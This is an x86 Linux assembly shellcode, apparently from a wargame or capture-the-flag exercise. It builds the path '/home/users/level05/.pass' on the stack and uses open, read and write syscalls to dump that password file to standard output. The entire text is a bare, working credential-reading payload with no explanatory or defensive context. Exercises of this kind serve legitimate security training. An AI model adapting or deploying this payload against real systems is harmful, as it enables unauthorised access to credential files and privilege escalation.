segment .text
global _start

_start:

	push 0x73
	push 0x7361702e
	push 0x2f35306c
	push 0x6576656c
	push 0x2f737265
	push 0x73752f65
	push 0x6d6f682f

	mov al, 0x5      ; 5 = sys_open
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	int 0x80

	sub esp, 100
	mov ebx, eax
	mov al, 0x3      ; 3 = sys_read
	mov ecx, esp      ; buf
	mov dl, 100
	int 0x80

	mov al, 0x4      ; 4 = sys_write
	mov bl, 0x1        ; stdout
	mov ecx, esp
	mov dl, 100
	int 0x80
